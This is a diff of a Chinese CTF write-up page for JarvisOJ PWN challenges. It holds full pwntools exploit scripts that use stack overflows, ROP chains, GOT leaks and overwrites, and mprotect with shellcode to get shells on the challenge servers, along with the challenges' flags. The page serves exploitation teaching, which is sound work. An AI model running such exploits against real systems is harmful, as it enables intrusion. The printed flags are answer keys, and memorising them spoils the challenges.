-    payload += p64(init_gadget1)+p64(0)+p64(1)+p64(func_got)+p64(arg3)+p64(arg2)+p64(arg1)
-    payload += p64(init_gadget2)+p64(0x1)*7
-    payload += p64(vulnerable_addr)
-    respone(&quot;Input:\n&quot;,payload)
-    if returnData:
-        Data = u64(pro.recv(8))
-    return Data
-
-read_addr = _call(elf.got[&#39;write&#39;],1,elf.got[&#39;read&#39;],8,True)#读出read的真实内存地址
-log.info(&#39;read_addr:%s&#39;,hex(read_addr))
-imageBase = read_addr - libc.symbols[&#39;read&#39;]#计算imageBase
-mprotect_addr = imageBase + libc.symbols[&#39;mprotect&#39;]#mprotect内存地址
-
-shell = asm(shellcraft.amd64.sh())#利用pwntools的shellcraft生成64位shellcode
-log.info(&#39;Writing Shell Code....&#39;)
-_call(elf.got[&#39;read&#39;],0,data_addr,len(shell))#调用read函数将ShellCode写入bss段
-pro.send(shell)
-log.info(&#39;Done!&#39;)
-
-log.info(&#39;Hijacking __libc_start_main Address....&#39;)
-_call(elf.got[&#39;read&#39;],0,elf.got[&#39;__libc_start_main&#39;],8)#修改__libc_start_main的got表地址成为我们mprotect地址
-pro.send(p64(mprotect_addr))
-log.info(&#39;Done!&#39;)
-
-log.info(&#39;Calling mprotect....&#39;)
-_call(elf.got[&#39;__libc_start_main&#39;],0x00600000,0x1000,7)#调用__libc_start_main函数，其实是调用mprotect函数，修改内存段成为可读写可执行的权限
-log.info(&#39;Done!&#39;)
-
-log.info(&#39;Geting shell...&#39;)
-payload = &quot;A&quot;*0x88
-payload += p64(data_addr)#调用ShellCode
-respone(&quot;Input:\n&quot;,payload)
-pro.interactive()
-</code></pre>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> ELF(<span class="st">&quot;./libc-2.19.so&quot;</span>)</span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9884</span>)</span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="co">#context.log_level = &#39;debug&#39;</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>context.arch <span class="op">=</span> <span class="st">&#39;amd64&#39;</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./level3_x64&quot;</span>)</span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>rdi_ret_addr <span class="op">=</span> <span class="bn">0x4006b3</span></span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a>vulnerable_addr <span class="op">=</span> <span class="bn">0x40062E</span></span>
+<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a>data_addr <span class="op">=</span> elf.bss()</span>
+<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a><span class="co">#__libc_csu_init 通用gadget</span></span>
+<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a>init_gadget1 <span class="op">=</span> <span class="bn">0x4006AA</span></span>
+<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a>init_gadget2 <span class="op">=</span> <span class="bn">0x400690</span></span>
+<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a><span class="co">#__libc_csu_init 通用gadget构造一个可循环利用的call函数，前提是需要知道got地址，且got地址对应的数据是真实内存地址</span></span>
+<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a><span class="co">#看不懂为什么这么构造的可以看我上一篇文章《百度杯11月pwnme》倒数第二段代码处的注释解释有__libc_csu_init 通用gadget的利用</span></span>
+<span id="cb16-22"><a href="#cb16-22" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> _call(func_got,arg1,arg2,arg3,returnData<span class="op">=</span><span class="va">False</span>):</span>
+<span id="cb16-23"><a href="#cb16-23" aria-hidden="true" tabindex="-1"></a>    Data <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb16-24"><a href="#cb16-24" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb16-25"><a href="#cb16-25" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> p64(init_gadget1)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(func_got)<span class="op">+</span>p64(arg3)<span class="op">+</span>p64(arg2)<span class="op">+</span>p64(arg1)</span>
+<span id="cb16-26"><a href="#cb16-26" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> p64(init_gadget2)<span class="op">+</span>p64(<span class="bn">0x1</span>)<span class="op">*</span><span class="dv">7</span></span>
+<span id="cb16-27"><a href="#cb16-27" aria-hidden="true" tabindex="-1"></a>    payload <span class="op">+=</span> p64(vulnerable_addr)</span>
+<span id="cb16-28"><a href="#cb16-28" aria-hidden="true" tabindex="-1"></a>    respone(<span class="st">&quot;Input:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb16-29"><a href="#cb16-29" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> returnData:</span>
+<span id="cb16-30"><a href="#cb16-30" aria-hidden="true" tabindex="-1"></a>        Data <span class="op">=</span> u64(pro.recv(<span class="dv">8</span>))</span>
+<span id="cb16-31"><a href="#cb16-31" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> Data</span>
+<span id="cb16-32"><a href="#cb16-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-33"><a href="#cb16-33" aria-hidden="true" tabindex="-1"></a>read_addr <span class="op">=</span> _call(elf.got[<span class="st">&#39;write&#39;</span>],<span class="dv">1</span>,elf.got[<span class="st">&#39;read&#39;</span>],<span class="dv">8</span>,<span class="va">True</span>)<span class="co">#读出read的真实内存地址</span></span>
+<span id="cb16-34"><a href="#cb16-34" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;read_addr:</span><span class="sc">%s</span><span class="st">&#39;</span>,<span class="bu">hex</span>(read_addr))</span>
+<span id="cb16-35"><a href="#cb16-35" aria-hidden="true" tabindex="-1"></a>imageBase <span class="op">=</span> read_addr <span class="op">-</span> libc.symbols[<span class="st">&#39;read&#39;</span>]<span class="co">#计算imageBase</span></span>
+<span id="cb16-36"><a href="#cb16-36" aria-hidden="true" tabindex="-1"></a>mprotect_addr <span class="op">=</span> imageBase <span class="op">+</span> libc.symbols[<span class="st">&#39;mprotect&#39;</span>]<span class="co">#mprotect内存地址</span></span>
+<span id="cb16-37"><a href="#cb16-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-38"><a href="#cb16-38" aria-hidden="true" tabindex="-1"></a>shell <span class="op">=</span> asm(shellcraft.amd64.sh())<span class="co">#利用pwntools的shellcraft生成64位shellcode</span></span>
+<span id="cb16-39"><a href="#cb16-39" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Writing Shell Code....&#39;</span>)</span>
+<span id="cb16-40"><a href="#cb16-40" aria-hidden="true" tabindex="-1"></a>_call(elf.got[<span class="st">&#39;read&#39;</span>],<span class="dv">0</span>,data_addr,<span class="bu">len</span>(shell))<span class="co">#调用read函数将ShellCode写入bss段</span></span>
+<span id="cb16-41"><a href="#cb16-41" aria-hidden="true" tabindex="-1"></a>pro.send(shell)</span>
+<span id="cb16-42"><a href="#cb16-42" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Done!&#39;</span>)</span>
+<span id="cb16-43"><a href="#cb16-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-44"><a href="#cb16-44" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Hijacking __libc_start_main Address....&#39;</span>)</span>
+<span id="cb16-45"><a href="#cb16-45" aria-hidden="true" tabindex="-1"></a>_call(elf.got[<span class="st">&#39;read&#39;</span>],<span class="dv">0</span>,elf.got[<span class="st">&#39;__libc_start_main&#39;</span>],<span class="dv">8</span>)<span class="co">#修改__libc_start_main的got表地址成为我们mprotect地址</span></span>
+<span id="cb16-46"><a href="#cb16-46" aria-hidden="true" tabindex="-1"></a>pro.send(p64(mprotect_addr))</span>
+<span id="cb16-47"><a href="#cb16-47" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Done!&#39;</span>)</span>
+<span id="cb16-48"><a href="#cb16-48" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-49"><a href="#cb16-49" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Calling mprotect....&#39;</span>)</span>
+<span id="cb16-50"><a href="#cb16-50" aria-hidden="true" tabindex="-1"></a>_call(elf.got[<span class="st">&#39;__libc_start_main&#39;</span>],<span class="bn">0x00600000</span>,<span class="bn">0x1000</span>,<span class="dv">7</span>)<span class="co">#调用__libc_start_main函数，其实是调用mprotect函数，修改内存段成为可读写可执行的权限</span></span>
+<span id="cb16-51"><a href="#cb16-51" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Done!&#39;</span>)</span>
+<span id="cb16-52"><a href="#cb16-52" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-53"><a href="#cb16-53" aria-hidden="true" tabindex="-1"></a>log.info(<span class="st">&#39;Geting shell...&#39;</span>)</span>
+<span id="cb16-54"><a href="#cb16-54" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb16-55"><a href="#cb16-55" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(data_addr)<span class="co">#调用ShellCode</span></span>
+<span id="cb16-56"><a href="#cb16-56" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;Input:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb16-57"><a href="#cb16-57" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
 <p><strong>Flag : CTF{9c3a234bd804292b153e7a1c25da648c}</strong></p>
-<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p><em>正在努力学习堆利用，待我学成之日。。。再另开一片文章详细解释对利用以及补充此题</em></p>
-<h1 id="level-2-x64"><a href="#level-2-x64" class="headerlink" title="level 2 x64"></a>level 2 x64</h1><p>与32位的level2一致，给了<code>system</code>函数以及<code>/bin/sh</code>字符串。<br>由于32位是栈上传参和64位是先由寄存器<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>rcx</code>,<code>r8</code>,<code>r9</code>传递前6位参数，再多的参数就丢栈上传递<br>所以我们需要找到一些<code>gadget</code>帮助我们传递<code>/bin/sh</code>进<code>rdi</code><br>之前的文章已经教了如何寻找<code>gadget</code>，此处我们直接用<code>ROPgadget</code>工具寻找</p>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-38-15.jpg" alt=""><br>万事俱备，poc如下:</p>
-<pre><code class="lang-python">from pwn import * 
-#pro = process(&quot;./level2_x64&quot;)
-pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9882)
-context.log_level = &#39;debug&#39;
-
-elf = ELF(&quot;./level2_x64&quot;)
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-pop_rdi_ret_addr = 0x4006b3
-bin_sh_addr = 0x600A90
-system_addr = 0x40063E
-
-payload = &quot;A&quot;*0x88
-payload += p64(pop_rdi_ret_addr)+p64(bin_sh_addr)
-payload += p64(system_addr)
-respone(&quot;Input:\n&quot;,payload)
-pro.interactive()
-</code></pre>
+<h1 id="level-6">level 6</h1>
+<p><em>正在努力学习堆利用，待我学成之日。。。再另开一片文章详细解释对利用以及补充此题</em></p>
+<h1 id="level-2-x64">level 2 x64</h1>
+<p>与32位的level2一致，给了<code>system</code>函数以及<code>/bin/sh</code>字符串。
+由于32位是栈上传参和64位是先由寄存器<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>rcx</code>,<code>r8</code>,<code>r9</code>传递前6位参数，再多的参数就丢栈上传递
+所以我们需要找到一些<code>gadget</code>帮助我们传递<code>/bin/sh</code>进<code>rdi</code>
+之前的文章已经教了如何寻找<code>gadget</code>，此处我们直接用<code>ROPgadget</code>工具寻找</p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-38-15.jpg">
+万事俱备，poc如下:</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./level2_x64&quot;)</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9882</span>)</span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./level2_x64&quot;</span>)</span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>pop_rdi_ret_addr <span class="op">=</span> <span class="bn">0x4006b3</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>bin_sh_addr <span class="op">=</span> <span class="bn">0x600A90</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> <span class="bn">0x40063E</span></span>
+<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(pop_rdi_ret_addr)<span class="op">+</span>p64(bin_sh_addr)</span>
+<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(system_addr)</span>
+<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;Input:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb17-21"><a href="#cb17-21" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
 <p><strong>Flag: CTF{081ecc7c8d658409eb43358dcc1cf446}</strong></p>
-<h1 id="level-3-x64"><a href="#level-3-x64" class="headerlink" title="level 3 x64"></a>level 3 x64</h1><p>与32位的level3也差不多，给了<code>libc</code>，给了溢出点，然后思路还是一样，就是要寻找<code>gadget</code>这点不同</p>
-<ol>
-<li>用<code>write</code>函数泄露出<code>write</code>的真实内存地址(通过泄露got表中对应的write条目实现)</li>
-<li>然后利用<code>write</code>函数真实内存地址减去给的<code>libc</code>中<code>write</code>函数的偏移得到<code>imageBase</code></li>
-<li>最后<code>imageBase</code>加上<code>libc</code>中<code>system</code>的偏移就是真实内存地址了，<code>/bin/sh</code>地址同理。</li>
-<li>构造ROP执行<code>system</code><br>本题我使用的是通用<code>gadget</code>函数<code>_libc_csu_init()</code>,该函数是用gcc编译的时候自带的，所以很通用。如何利用<code>_libc_csu_init()</code>函数构造ROP上文以及上一篇文章已经说过了，就不再赘述了</li>
-</ol>
+<h1 id="level-3-x64">level 3 x64</h1>
+<p>与32位的level3也差不多，给了<code>libc</code>，给了溢出点，然后思路还是一样，就是要寻找<code>gadget</code>这点不同
+1.
+用<code>write</code>函数泄露出<code>write</code>的真实内存地址(通过泄露got表中对应的write条目实现)
+2.
+然后利用<code>write</code>函数真实内存地址减去给的<code>libc</code>中<code>write</code>函数的偏移得到<code>imageBase</code>
+3.
+最后<code>imageBase</code>加上<code>libc</code>中<code>system</code>的偏移就是真实内存地址了，<code>/bin/sh</code>地址同理。
+4. 构造ROP执行<code>system</code>
+本题我使用的是通用<code>gadget</code>函数<code>_libc_csu_init()</code>,该函数是用gcc编译的时候自带的，所以很通用。如何利用<code>_libc_csu_init()</code>函数构造ROP上文以及上一篇文章已经说过了，就不再赘述了</p>
 <p>poc:</p>
-<pre><code class="lang-python">from pwn import * 
-#pro = process(&quot;./level3_x64&quot;)
-libc = ELF(&quot;./libc-2.19.so&quot;)
-pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9883)
-context.log_level = &#39;debug&#39;
-elf = ELF(&quot;./level3_x64&quot;)
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-
-rdi_ret_addr = 0x4006b3
-vulnerable_addr = 0x40062E
-init_gadget1 = 0x4006AA
-init_gadget2 = 0x400690
-
-payload = &quot;A&quot;*0x88
-payload += p64(init_gadget1)+p64(0)+p64(1)+p64(elf.got[&#39;write&#39;])+p64(8)+p64(elf.got[&#39;write&#39;])+p64(1)#调用write泄露write真是内存地址
-payload += p64(init_gadget2)+p64(0x1)*7
-payload += p64(vulnerable_addr)#重新回到漏洞函数处
-respone(&quot;Input:\n&quot;,payload)
-
-data = u64(pro.recv(8))
-#计算基址以及函数地址
-imageBase = data - libc.symbols[&#39;write&#39;]
-system_addr = imageBase + libc.symbols[&#39;system&#39;]
-bin_sh_addr = imageBase + next(libc.search(&#39;/bin/sh&#39;))
-#起shell
-payload = &quot;A&quot;*0x88
-payload += p64(rdi_ret_addr)+p64(bin_sh_addr)+p64(system_addr)
-respone(&quot;Input:\n&quot;,payload)
-pro.interactive()
-</code></pre>
+<div class="sourceCode" id="cb18"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="co">#pro = process(&quot;./level3_x64&quot;)</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> ELF(<span class="st">&quot;./libc-2.19.so&quot;</span>)</span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>pro <span class="op">=</span> remote(<span class="st">&quot;pwn2.jarvisoj.com&quot;</span>, <span class="dv">9883</span>)</span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> ELF(<span class="st">&quot;./level3_x64&quot;</span>)</span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> respone(recv_buf,send_buf,new_line<span class="op">=</span><span class="va">True</span>):</span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a>    pro.recvuntil(recv_buf)</span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> new_line:</span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true" tabindex="-1"></a>        pro.sendline(send_buf)</span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">else</span>:</span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true" tabindex="-1"></a>        pro.send(send_buf)</span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a>rdi_ret_addr <span class="op">=</span> <span class="bn">0x4006b3</span></span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a>vulnerable_addr <span class="op">=</span> <span class="bn">0x40062E</span></span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a>init_gadget1 <span class="op">=</span> <span class="bn">0x4006AA</span></span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a>init_gadget2 <span class="op">=</span> <span class="bn">0x400690</span></span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(init_gadget1)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">+</span>p64(<span class="dv">1</span>)<span class="op">+</span>p64(elf.got[<span class="st">&#39;write&#39;</span>])<span class="op">+</span>p64(<span class="dv">8</span>)<span class="op">+</span>p64(elf.got[<span class="st">&#39;write&#39;</span>])<span class="op">+</span>p64(<span class="dv">1</span>)<span class="co">#调用write泄露write真是内存地址</span></span>
+<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(init_gadget2)<span class="op">+</span>p64(<span class="bn">0x1</span>)<span class="op">*</span><span class="dv">7</span></span>
+<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(vulnerable_addr)<span class="co">#重新回到漏洞函数处</span></span>
+<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;Input:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a>data <span class="op">=</span> u64(pro.recv(<span class="dv">8</span>))</span>
+<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a><span class="co">#计算基址以及函数地址</span></span>
+<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a>imageBase <span class="op">=</span> data <span class="op">-</span> libc.symbols[<span class="st">&#39;write&#39;</span>]</span>
+<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a>system_addr <span class="op">=</span> imageBase <span class="op">+</span> libc.symbols[<span class="st">&#39;system&#39;</span>]</span>
+<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a>bin_sh_addr <span class="op">=</span> imageBase <span class="op">+</span> <span class="bu">next</span>(libc.search(<span class="st">&#39;/bin/sh&#39;</span>))</span>
+<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a><span class="co">#起shell</span></span>
+<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x88</span></span>
+<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(rdi_ret_addr)<span class="op">+</span>p64(bin_sh_addr)<span class="op">+</span>p64(system_addr)</span>
+<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a>respone(<span class="st">&quot;Input:</span><span class="ch">\n</span><span class="st">&quot;</span>,payload)</span>
+<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a>pro.interactive()</span></code></pre></div>
 <p><strong>Flag: CTF{b1aeaa97fdcc4122533290b73765e4fd}</strong></p>
-<h1 id="Test-Your-Memory"><a href="#Test-Your-Memory" class="headerlink" title="Test Your Memory"></a>Test Your Memory</h1><p>直接上IDA</p>
-<pre><code class="lang-C">int __cdecl mem_test(char *s2)
-{
-  int result; // eax@2
-  char s; // [sp+15h] [bp-13h]@1
-
-  memset(&amp;s, 0, 11u);
-  puts(&quot;\nwhat???? : &quot;);
-  printf(&quot;0x%x \n&quot;, hint);
-  puts(&quot;cff flag go go go ...\n&quot;);
-  printf(&quot;&gt; &quot;);
-  __isoc99_scanf(&quot;%s&quot;, &amp;s);//溢出点
-    if ( !strncmp(&amp;s, s2, 4u) )
-    result = puts(&quot;good job!!\n&quot;);
-  else
-    result = puts(&quot;cff flag is failed!!\n&quot;);
-  return result;
-}
-</code></pre>
-<p>问题出在<code>mem_test()</code>函数的<code>scanf</code>上，查看栈结构很容易知道溢出填充长度为<code>23</code>。<br>此外还有一个<code>win_func()</code>函数和一个<code>catFlag</code>只读数据</p>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-56-31.jpg" alt=""></p>
-<pre><code class="lang-C">int __cdecl win_func(char *command)
-{
-  return system(command);
-}
-</code></pre>
-<p>所以思路就很简单了。<br>溢出跳过<code>win_func()</code>，然后栈上传个<code>catFlag</code>就好了</p>
-<pre><code class="lang-python">from pwn import * 
-#pro = process(&quot;./memory&quot;) 
-pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9876)
-context.log_level = &#39;debug&#39;
-def respone(recv_buf,send_buf,new_line=True):
-    pro.recvuntil(recv_buf)
-    if new_line:
-        pro.sendline(send_buf)
-    else:
-        pro.send(send_buf)
-payload = &quot;A&quot;*23
-payload +=p32(0x80485BD)
-payload +=p32(0x80487E0)+p32(0x80487E0)
-respone(&quot;&gt; &quot;,payload)
-pro.interactive()
-</code></pre>
+<h1 id="test-your-memory">Test Your Memory</h1>
+<p>直接上IDA</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> __cdecl mem_test<span class="op">(</span><span class="dt">char</span> <span class="op">*</span>s2<span class="op">)</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> result<span class="op">;</span> <span class="co">// eax@2</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">char</span> s<span class="op">;</span> <span class="co">// [sp+15h] [bp-13h]@1</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>  memset<span class="op">(&amp;</span>s<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="dv">11</span><span class="bu">u</span><span class="op">);</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">what???? : &quot;</span><span class="op">);</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>  printf<span class="op">(</span><span class="st">&quot;0x%x </span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> hint<span class="op">);</span></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>  puts<span class="op">(</span><span class="st">&quot;cff flag go go go ...</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
